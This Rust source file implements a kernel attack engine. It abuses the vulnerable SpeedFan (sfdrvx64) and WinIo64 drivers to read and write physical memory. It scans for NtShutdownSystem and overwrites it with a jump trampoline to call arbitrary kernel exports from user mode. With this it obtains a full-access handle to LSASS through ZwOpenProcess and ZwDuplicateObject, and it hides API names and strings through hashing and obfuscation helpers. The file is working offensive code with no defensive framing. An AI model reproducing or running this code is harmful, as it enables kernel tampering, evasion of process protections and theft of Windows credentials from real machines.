//! Hybrid DM_KernelSyscall — sfdrvx64 reads + WinIo64 writes
//!
//! sfdrvx64 reads work fine (MmMapIoSpace read-only OK), but writes fail
//! with err=998 on kernel code pages (PTE read-only).
//! WinIo64 writes use ZwMapViewOfSection(\Device\PhysicalMemory) which
//! creates independent R/W PTEs — bypasses the protection.

use crate::resolver::*;
use windows::Win32::Foundation::*;

/// WinIo PhysStruct — 40 bytes
#[repr(C)]
#[derive(Clone, Copy, Default)]
struct PhysStruct {
    size: u64,
    phys_addr: u64,
    section_handle: u64,
    mapped_va: u64,
    section_object: u64,
}

type FnCreateFileW =
    unsafe extern "system" fn(*const u16, u32, u32, *const u8, u32, u32, HANDLE) -> HANDLE;
type FnDeviceIoControl = unsafe extern "system" fn(
    HANDLE,
    u32,
    *const u8,
    u32,
    *mut u8,
    u32,
    *mut u32,
    *const u8,
) -> BOOL;
type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> BOOL;

type FnTrampoline = unsafe extern "system" fn(
    usize,
    usize,
    usize,
    usize,
    usize,
    usize,
    usize,
    usize,
    usize,
    usize,
) -> i32;

/// Hybrid DM_KernelSyscall engine: sfdrvx64 (read) + WinIo64 (write)
pub struct DmEngine {
    dev_sfdrv: HANDLE, // sfdrvx64 device — for reads
    dev_winio: HANDLE, // WinIo64 device — for writes
    fn_ioctl: FnDeviceIoControl,
    fn_close: FnCloseHandle,
    trampoline_user: FnTrampoline,
    trampoline_phys: u64,
    ntos_virt_base: u64,
}

impl DmEngine {
    pub fn new(api: &ApiResolver) -> Result<Self, String> {
        let fn_create: FnCreateFileW = unsafe {
            std::mem::transmute(api.k32(HASH_CREATE_FILE_W).ok_or("resolve CreateFileW")?)
        };
        let fn_ioctl: FnDeviceIoControl = unsafe {
            std::mem::transmute(
                api.k32(HASH_DEVICE_IO_CONTROL)
                    .ok_or("resolve DeviceIoControl")?,
            )
        };
        let fn_close: FnCloseHandle = unsafe {
            std::mem::transmute(api.k32(HASH_CLOSE_HANDLE).ok_or("resolve CloseHandle")?)
        };
        let trampoline_user: FnTrampoline = unsafe {
            std::mem::transmute(
                api.ntdll(HASH_NT_SHUTDOWN_SYSTEM)
                    .ok_or("resolve NtShutdownSystem")?,
            )
        };

        // Open sfdrvx64 device (for reads)
        let sfdrv_path = crate::obfstr_helper::dev_speedfan();
        let dev_sfdrv = unsafe {
            fn_create(
                sfdrv_path.as_ptr(),
                0xC0000000,
                0,
                std::ptr::null(),
                3,
                0x80,
                HANDLE::default(),
            )
        };
        if dev_sfdrv.is_invalid() {
            return Err(format!("open Speedfan: error {}", unsafe {
                GetLastError().0
            }));
        }
        println!("    [hybrid] sfdrvx64 device opened (read)");

        // Open WinIo64 device (for writes)
        let winio_path = crate::obfstr_helper::dev_winio();
        let dev_winio = unsafe {
            fn_create(
                winio_path.as_ptr(),
                0xC0000000,
                0,
                std::ptr::null(),
                3,
                0x80,
                HANDLE::default(),
            )
        };
        if dev_winio.is_invalid() {
            unsafe {
                let _ = fn_close(dev_sfdrv);
            }
            return Err(format!("open WinIo: error {}", unsafe { GetLastError().0 }));
        }
        println!("    [hybrid] WinIo64 device opened (write)");

        let mut engine = DmEngine {
            dev_sfdrv,
            dev_winio,
            fn_ioctl,
            fn_close,
            trampoline_user,
            trampoline_phys: 0,
            ntos_virt_base: 0,
        };

        engine.ntos_virt_base = crate::ppl::get_ntoskrnl_base_ntapi()?;
        println!(
            "    [hybrid] ntoskrnl virt base: 0x{:016X}",
            engine.ntos_virt_base
        );

        engine.trampoline_phys = engine.locate_syscall()?;
        println!(
            "    [hybrid] Trampoline phys: 0x{:016X}",
            engine.trampoline_phys
        );

        Ok(engine)
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Physical memory primitives
    // ═══════════════════════════════════════════════════════════════════════

    /// Read via sfdrvx64 IOCTL (MmMapIoSpace — works for reads)
    fn read_phys(&self, phys_addr: u64, buf: &mut [u8]) -> Result<(), String> {
        let input = phys_addr.to_le_bytes();
        let mut ret = 0u32;
        let ok = unsafe {
            (self.fn_ioctl)(
                self.dev_sfdrv,
                crate::obfstr_helper::ioctl_phymem_read(),
                input.as_ptr(),
                8,
                buf.as_mut_ptr(),
                buf.len() as u32,
                &mut ret,
                std::ptr::null(),
            )
        };
        if !ok.as_bool() {
            return Err(format!(
                "read_phys 0x{:X} ({}B): ioctl failed, err={}",
                phys_addr,
                buf.len(),
                unsafe { GetLastError().0 }
            ));
        }
        Ok(())
    }

    /// Write via WinIo64 Section mapping (bypasses PTE read-only on code pages)
    fn write_phys(&self, phys_addr: u64, data: &[u8]) -> Result<(), String> {
        // 1. Map physical memory to user-mode VA
        let mut ps = PhysStruct {
            size: data.len() as u64,
            phys_addr,
            section_handle: 0,
            mapped_va: 0,
            section_object: 0,
        };
        let mut ret = 0u32;
        let ok = unsafe {
            (self.fn_ioctl)(
                self.dev_winio,
                crate::obfstr_helper::ioctl_winio_map(),
                &ps as *const _ as *const u8,
                std::mem::size_of::<PhysStruct>() as u32,
                &mut ps as *mut _ as *mut u8,
                std::mem::size_of::<PhysStruct>() as u32,
                &mut ret,
                std::ptr::null(),
            )
        };
        if !ok.as_bool() || ps.mapped_va == 0 {
            return Err(format!(
                "write_phys map 0x{:X} ({}B): ioctl failed, err={}",
                phys_addr,
                data.len(),
                unsafe { GetLastError().0 }
            ));
        }

        // 2. Write directly to mapped user-mode VA
        unsafe {
            std::ptr::copy_nonoverlapping(data.as_ptr(), ps.mapped_va as *mut u8, data.len());
        }

        // 3. Unmap
        let _ = unsafe {
            (self.fn_ioctl)(
                self.dev_winio,
                crate::obfstr_helper::ioctl_winio_unmap(),
                &ps as *const _ as *const u8,
                std::mem::size_of::<PhysStruct>() as u32,
                std::ptr::null_mut(),
                0,
                &mut ret,
                std::ptr::null(),
            )
        };
        Ok(())
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Physical memory range discovery
    // ═══════════════════════════════════════════════════════════════════════

    fn get_physical_memory_ranges() -> Result<Vec<(u64, u64)>, String> {
        use windows::Win32::System::Registry::*;

        let mut key = HKEY::default();
        let subkey = crate::obfstr_helper::phys_mem_regkey();
        let status = unsafe {
            RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                windows::core::PCWSTR(subkey.as_ptr()),
                0,
                KEY_READ,
                &mut key,
            )
        };
        if status.is_err() {
            return Err(format!("RegOpenKeyExW failed: {:?}", status));
        }

        let value_name_buf = crate::obfstr_helper::translated_value();
        let value_name = windows::core::PCWSTR(value_name_buf.as_ptr());
        let mut data_type = REG_VALUE_TYPE::default();
        let mut data_size: u32 = 0;
        unsafe {
            let _ = RegQueryValueExW(
                key,
                value_name,
                None,
                Some(&mut data_type),
                None,
                Some(&mut data_size),
            );
        }
        if data_size == 0 {
            unsafe {
                let _ = RegCloseKey(key);
            }
            return Err("Physical Memory registry value empty".into());
        }

        let mut data = vec![0u8; data_size as usize];
        let status = unsafe {
            RegQueryValueExW(
                key,
                value_name,
                None,
                Some(&mut data_type),
                Some(data.as_mut_ptr()),
                Some(&mut data_size),
            )
        };
        unsafe {
            let _ = RegCloseKey(key);
        }
        if status.is_err() {
            return Err(format!("RegQueryValueExW failed: {:?}", status));
        }

        let mut ranges = Vec::new();
        if data.len() < 24 {
            return Err(format!("Registry data too short: {} bytes", data.len()));
        }

        let count = u32::from_le_bytes(data[16..20].try_into().unwrap()) as usize;
        let mut offset = 20usize;

        for i in 0..count {
            if offset + 20 > data.len() {
                break;
            }
            let flags = u16::from_le_bytes(data[offset + 2..offset + 4].try_into().unwrap());
            let p_begin = u64::from_le_bytes(data[offset + 4..offset + 12].try_into().unwrap());
            let size_raw = u32::from_le_bytes(data[offset + 12..offset + 16].try_into().unwrap());

            let size: u64 = if flags & 0x200 != 0 {
                (size_raw as u64) << 8
            } else if flags & 0x400 != 0 {
                (size_raw as u64) << 16
            } else if flags & 0x800 != 0 {
                (size_raw as u64) << 32
            } else {
                size_raw as u64
            };

            println!(
                "    [hybrid] Range {}: base=0x{:X} size=0x{:X} ({:.1}MB)",
                i,
                p_begin,
                size,
                size as f64 / (1024.0 * 1024.0)
            );

            if p_begin >= 0x10000 && size > 0 {
                ranges.push((p_begin, size));
            }
            offset += 20;
        }

        if ranges.is_empty() {
            return Err("No valid physical memory ranges found".into());
        }
        println!(
            "    [hybrid] {} physical memory ranges ({} MB)",
            ranges.len(),
            ranges.iter().map(|(_, s)| s).sum::<u64>() / (1024 * 1024)
        );
        Ok(ranges)
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Trampoline locator (uses sfdrvx64 reads)
    // ═══════════════════════════════════════════════════════════════════════

    fn locate_syscall(&self) -> Result<u64, String> {
        let ranges = Self::get_physical_memory_ranges()?;
        let (nt_rva, ref_bytes) = Self::get_trampoline_info()?;
        println!("    [hybrid] NtShutdownSystem RVA: 0x{:X}", nt_rva);
        println!(
            "    [hybrid] Reference bytes: {:02X?}",
            &ref_bytes[..8.min(ref_bytes.len())]
        );

        let large_page: u64 = 0x20_0000;
        let match_len = ref_bytes.len();

        use std::io::Write;
        let mut total_reads = 0u64;

        println!("    [hybrid] Scanning physical memory (sfdrvx64 read IOCTL)...");

        for (range_idx, (range_base, range_size)) in ranges.iter().enumerate() {
            let range_end = range_base + range_size;
            let start = std::cmp::max(*range_base, 0x10_0000);
            if start >= range_end {
                continue;
            }

            let first_cand = (start + large_page - 1) & !(large_page - 1);
            let mut cand = first_cand;

            while cand < range_end {
                let func_addr = cand + nt_rva as u64;
                if func_addr + match_len as u64 <= range_end {
                    let mut buf = vec![0u8; match_len];
                    if self.read_phys(func_addr, &mut buf).is_ok() {
                        total_reads += 1;
                        if buf == ref_bytes {
                            println!(
                                "\r    [hybrid] Code match! phys=0x{:X} base=0x{:X}   ",
                                func_addr, cand
                            );

                            // Verify using WinIo64 write
                            if self.verify_trampoline(func_addr)? {
                                println!("    [hybrid] ✓ Verified! ({} reads)", total_reads);
                                return Ok(func_addr);
                            }
                            println!("    [hybrid] ✗ Verify failed, continuing...");
                        }
                    }
                }

                cand += large_page;
                if total_reads % 200 == 0 {
                    print!(
                        "\r    [hybrid] Range {}/{}: {} reads, addr=0x{:X}   ",
                        range_idx + 1,
                        ranges.len(),
                        total_reads,
                        cand
                    );
                    let _ = std::io::stdout().flush();
                }
            }
        }
        println!("\r    [hybrid] Done: {} reads, not found   ", total_reads);
        Err("NtShutdownSystem not found in physical memory".to_string())
    }

    fn get_trampoline_info() -> Result<(u32, Vec<u8>), String> {
        let ntos_wide = crate::obfstr_helper::ntos_filename_wide();
        let lib = unsafe {
            windows::Win32::System::LibraryLoader::LoadLibraryExW(
                windows::core::PCWSTR(ntos_wide.as_ptr()),
                None,
                windows::Win32::System::LibraryLoader::DONT_RESOLVE_DLL_REFERENCES,
            )
        }
        .map_err(|e| format!("LoadLibraryExW: {}", e))?;

        let base = lib.0 as *const u8;
        let nt_name = crate::obfstr_helper::nt_shutdown_system_bytes();
        let func = unsafe {
            windows::Win32::System::LibraryLoader::GetProcAddress(
                lib,
                windows::core::PCSTR(nt_name.as_ptr()),
            )
        };
        let func_addr = func.ok_or("export not found")?;
        let rva = (func_addr as usize - base as usize) as u32;

        let mut ref_bytes = vec![0u8; 32];
        unsafe {
            std::ptr::copy_nonoverlapping(func_addr as *const u8, ref_bytes.as_mut_ptr(), 32);
        }
        Ok((rva, ref_bytes))
    }

    fn verify_trampoline(&self, phys_addr: u64) -> Result<bool, String> {
        let shellcode: [u8; 13] = [
            0x48, 0x29, 0xC0, 0x48, 0x83, 0xC0, 0x42, 0x48, 0x83, 0xE8, 0x42, 0x90, 0xC3,
        ];
        let mut orig = [0u8; 13];
        self.read_phys(phys_addr, &mut orig)?; // sfdrvx64 read
        self.write_phys(phys_addr, &shellcode)?; // WinIo64 write

        let result = unsafe { (self.trampoline_user)(0, 0, 0, 0, 0, 0, 0, 0, 0, 0) };

        self.write_phys(phys_addr, &orig)?; // WinIo64 restore
        Ok(result == 0)
    }

    // ═══════════════════════════════════════════════════════════════════════
    // DM_KernelSyscall core
    // ═══════════════════════════════════════════════════════════════════════

    pub unsafe fn kernel_syscall(&self, target_func: &str, args: &[usize]) -> Result<i32, String> {
        let target_rva = Self::find_export_rva_from_disk(target_func)?;
        let target_va = self.ntos_virt_base + target_rva as u64;

        let mut jmp_code = [0u8; 14];
        jmp_code[0] = 0xFF;
        jmp_code[1] = 0x25;
        jmp_code[6..14].copy_from_slice(&target_va.to_le_bytes());

        let mut orig = [0u8; 14];
        self.read_phys(self.trampoline_phys, &mut orig)?; // sfdrvx64 read
        self.write_phys(self.trampoline_phys, &jmp_code)?; // WinIo64 write

        let a = |i: usize| -> usize {
            if i < args.len() {
                args[i]
            } else {
                0
            }
        };
        let result =
            (self.trampoline_user)(a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7), a(8), a(9));

        self.write_phys(self.trampoline_phys, &orig)?; // WinIo64 restore
        Ok(result)
    }

    // ═══════════════════════════════════════════════════════════════════════
    // High-level kernel operations
    // ═══════════════════════════════════════════════════════════════════════

    pub fn open_process(&self, pid: u32) -> Result<HANDLE, String> {
        #[repr(C)]
        struct ClientId {
            unique_process: usize,
            unique_thread: usize,
        }
        #[repr(C)]
        struct ObjectAttributes {
            length: u32,
            root_directory: usize,
            object_name: usize,
            attributes: u32,
            security_descriptor: usize,
            security_qos: usize,
        }

        let obj_attr = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: 0,
            object_name: 0,
            attributes: 0x200,
            security_descriptor: 0,
            security_qos: 0,
        };

        let mut h_lsass: usize = 0;
        let cid_lsass = ClientId {
            unique_process: pid as usize,
            unique_thread: 0,
        };
        let status = unsafe {
            self.kernel_syscall(
                &crate::obfstr_helper::zw_open_process(),
                &[
                    &mut h_lsass as *mut usize as usize,
                    0x1F0FFF,
                    &obj_attr as *const _ as usize,
                    &cid_lsass as *const _ as usize,
                ],
            )?
        };
        if status < 0 {
            return Err(format!(
                "ZwOpenProcess(lsass) failed: 0x{:08X}",
                status as u32
            ));
        }
        println!("    [hybrid] Kernel handle to LSASS: 0x{:X}", h_lsass);

        let mut h_current: usize = 0;
        let current_pid = unsafe { windows::Win32::System::Threading::GetCurrentProcessId() };
        let cid_current = ClientId {
            unique_process: current_pid as usize,
            unique_thread: 0,
        };
        let status = unsafe {
            self.kernel_syscall(
                &crate::obfstr_helper::zw_open_process(),
                &[
                    &mut h_current as *mut usize as usize,
                    0x1F0FFF,
                    &obj_attr as *const _ as usize,
                    &cid_current as *const _ as usize,
                ],
            )?
        };
        if status < 0 {
            return Err(format!(
                "ZwOpenProcess(current) failed: 0x{:08X}",
                status as u32
            ));
        }
        println!("    [hybrid] Kernel handle to current: 0x{:X}", h_current);

        let mut h_user: usize = 0;
        let status = unsafe {
            self.kernel_syscall(
                &crate::obfstr_helper::zw_duplicate_object(),
                &[
                    usize::MAX,
                    h_lsass,
                    h_current,
                    &mut h_user as *mut usize as usize,
                    0,
                    0,
                    0x04,
                ],
            )?
        };
        if status < 0 {
            return Err(format!("ZwDuplicateObject failed: 0x{:08X}", status as u32));
        }
        println!("    [hybrid] User-mode handle: 0x{:X}", h_user);

        unsafe {
            let _ = self.kernel_syscall(&crate::obfstr_helper::zw_close(), &[h_lsass]);
            let _ = self.kernel_syscall(&crate::obfstr_helper::zw_close(), &[h_current]);
        }
        Ok(HANDLE(h_user as *mut _))
    }

    // ═══════════════════════════════════════════════════════════════════════
    // PE export parsing
    // ═══════════════════════════════════════════════════════════════════════

    fn find_export_rva_from_disk(func_name: &str) -> Result<u32, String> {
        let path = crate::obfstr_helper::ntos_path();
        let data = std::fs::read(&path).map_err(|e| format!("read failed: {}", e))?;

        let pe_off = u32::from_le_bytes(data[0x3C..0x40].try_into().unwrap()) as usize;
        let opt_off = pe_off + 24;
        let export_rva =
            u32::from_le_bytes(data[opt_off + 112..opt_off + 116].try_into().unwrap()) as usize;
        let export_size =
            u32::from_le_bytes(data[opt_off + 116..opt_off + 120].try_into().unwrap()) as usize;

        if export_rva == 0 {
            return Err("No export directory".into());
        }

        let num_sections =
            u16::from_le_bytes(data[pe_off + 6..pe_off + 8].try_into().unwrap()) as usize;
        let opt_hdr_size =
            u16::from_le_bytes(data[pe_off + 20..pe_off + 22].try_into().unwrap()) as usize;
        let sections_off = pe_off + 24 + opt_hdr_size;

        let rva_to_offset = |rva: usize| -> Option<usize> {
            for i in 0..num_sections {
                let s = sections_off + i * 40;
                let vaddr = u32::from_le_bytes(data[s + 12..s + 16].try_into().unwrap()) as usize;
                let vsize = u32::from_le_bytes(data[s + 8..s + 12].try_into().unwrap()) as usize;
                let raw_off = u32::from_le_bytes(data[s + 20..s + 24].try_into().unwrap()) as usize;
                if rva >= vaddr && rva < vaddr + vsize {
                    return Some(raw_off + (rva - vaddr));
                }
            }
            None
        };

        let exp_off = rva_to_offset(export_rva).ok_or("map export dir RVA")?;
        let num_names =
            u32::from_le_bytes(data[exp_off + 24..exp_off + 28].try_into().unwrap()) as usize;
        let addr_table_rva =
            u32::from_le_bytes(data[exp_off + 28..exp_off + 32].try_into().unwrap()) as usize;
        let name_table_rva =
            u32::from_le_bytes(data[exp_off + 32..exp_off + 36].try_into().unwrap()) as usize;
        let ord_table_rva =
            u32::from_le_bytes(data[exp_off + 36..exp_off + 40].try_into().unwrap()) as usize;

        let name_table_off = rva_to_offset(name_table_rva).ok_or("map name table")?;
        let ord_table_off = rva_to_offset(ord_table_rva).ok_or("map ord table")?;
        let addr_table_off = rva_to_offset(addr_table_rva).ok_or("map addr table")?;

        for i in 0..num_names {
            let name_rva = u32::from_le_bytes(
                data[name_table_off + i * 4..name_table_off + i * 4 + 4]
                    .try_into()
                    .unwrap(),
            ) as usize;
            let name_off = match rva_to_offset(name_rva) {
                Some(o) => o,
                None => continue,
            };
            let end = data[name_off..].iter().position(|&b| b == 0).unwrap_or(256);
            let name = std::str::from_utf8(&data[name_off..name_off + end]).unwrap_or("");

            if name == func_name {
                let ordinal = u16::from_le_bytes(
                    data[ord_table_off + i * 2..ord_table_off + i * 2 + 2]
                        .try_into()
                        .unwrap(),
                ) as usize;
                let func_rva = u32::from_le_bytes(
                    data[addr_table_off + ordinal * 4..addr_table_off + ordinal * 4 + 4]
                        .try_into()
                        .unwrap(),
                );
                if (func_rva as usize) >= export_rva
                    && (func_rva as usize) < export_rva + export_size
                {
                    return Err(format!("{} is forwarded", func_name));
                }
                return Ok(func_rva);
            }
        }
        Err(format!("'{}' not found in ntoskrnl exports", func_name))
    }
}

impl Drop for DmEngine {
    fn drop(&mut self) {
        unsafe {
            let _ = (self.fn_close)(self.dev_sfdrv);
            let _ = (self.fn_close)(self.dev_winio);
        }
    }
}
